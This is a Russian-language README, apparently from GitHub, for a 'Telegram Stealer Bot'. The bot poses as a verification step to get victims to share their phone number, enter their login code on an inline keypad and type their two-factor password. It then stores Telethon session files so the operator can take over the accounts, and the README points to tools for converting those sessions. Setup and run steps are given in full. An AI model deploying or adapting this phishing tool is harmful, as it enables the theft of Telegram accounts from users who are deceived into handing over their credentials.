# ✅ Telegram Stealer Bot

Бот для получения доступа к аккаунтам Telegram через встроенный интерфейс. Пользователь отправляет свой номер телефона, вводит код подтверждения (удобная inline-клавиатура) и, при необходимости, пароль двухэтапной аутентификации. После успешной верификации бот сообщает об успехе.

> Полученные файлы сессий можно легко конвертировать через сторонние софты (есть бесплатные на github)

---

## ✨ Возможности

- **Запрос контакта** – пользователь нажимает кнопку «Поделиться контактом», бот получает номер телефона.
- **Инлайн-клавиатура для кода** – удобный ввод 5-значного кода подтверждения без переключения на клавиатуру.
- **Поддержка двухэтапной аутентификации (2FA)** – если на аккаунте включен пароль, бот запросит его текстом.
- **Информативное стартовое сообщение** – содержит картинку, ссылки на канал и чат, кнопку начала верификации.
- **Сессии Telethon** – каждая верификация использует отдельный файл сессии в папке `sessions/` (по номеру телефона).
- **Асинхронность** – на базе aiogram 3.x.

## 🛠 Технологии

- Python 3.8+
- [aiogram 3.x](https://docs.aiogram.dev/) – фреймворк для ботов
- [Telethon](https://docs.telethon.dev/) – работа с Telegram API (авторизация)
- [python-dotenv](https://github.com/theskumar/python-dotenv) – переменные окружения
- asyncio

## 🚀 Установка и запуск

1. **Клонируйте репозиторий**
   ```bash
   git clone https://github.com/RusGheast/stealer-telegram-acc.git
   ```
   ```bash
   cd stealer-telegram-acc
   ```
   
Создайте виртуальное окружение и активируйте его

```bash
python -m venv venv
source venv/bin/activate      # Linux/Mac
venv\Scripts\activate         # Windows
```

Установите зависимости

```bash
pip install aiogram telethon dotenv
```

Получите Telegram API-данные

Перейдите на my.telegram.org, войдите.

Создайте приложение, получите api_id и api_hash.

Настройте переменные окружения
В корне проекта создайте файл .env и укажите:

```env
BOT_TOKEN=ваш_токен_бота
API_ID=ваш_api_id
API_HASH=ваш_api_hash
```

Подготовьте стартовую картинку

Поместите изображение в папку pictures/photo_2025-02-05_15-12-49.jpg (или измените путь в коде).

Запустите бота

```bash
python run.py
```

---

🧑‍💻 Как это работает

Пользователь отправляет команду /start.

Бот присылает приветственное сообщение с картинкой, ссылками на канал и чат, а также кнопку «📋 Пройти верификацию».

По нажатию на кнопку бот просит поделиться контактом (кнопка «Поделиться контактом»).

После получения номера телефона бот создаёт сессию Telethon и отправляет запрос на получение кода.

Отображается инлайн-клавиатура с цифрами и кнопками:

1-9, 0 – ввод цифр (максимум 5 символов).

⌫ – удаление последнего символа.

✅ – отправка введённого кода.

Если код верный, бот завершает авторизацию и сообщает об успехе.

Если аккаунт защищён двухэтапным паролем, бот запрашивает пароль в текстовом поле.

После успешной верификации сессия сохраняется в папке sessions/ (для повторных входов не требуется повторный код).

---

⚙️ Настройка

Стартовое сообщение – редактируется в хендлере @dp.message(Command("start")) в run.py (переменная caption и ссылки).

Картинка – путь pictures/photo_2025-02-05_15-12-49.jpg можно изменить.

Лимит длины кода – в коде стоит ограничение на 5 символов (if len(current_code) > 5). Если Telegram присылает код другой длины, измените это значение.

Папка сессий – по умолчанию sessions/ (создаётся автоматически).

---

⚠️ Важные замечания

Сессии – файлы сессий хранятся локально. Никому не передавайте их.

Безопасность – не публикуйте .env и sessions/ в репозитории (добавьте их в .gitignore).

Ограничения Telethon – при слишком частых запросах может возникнуть FloodWaitError, бот пока не обрабатывает это (можно доработать).
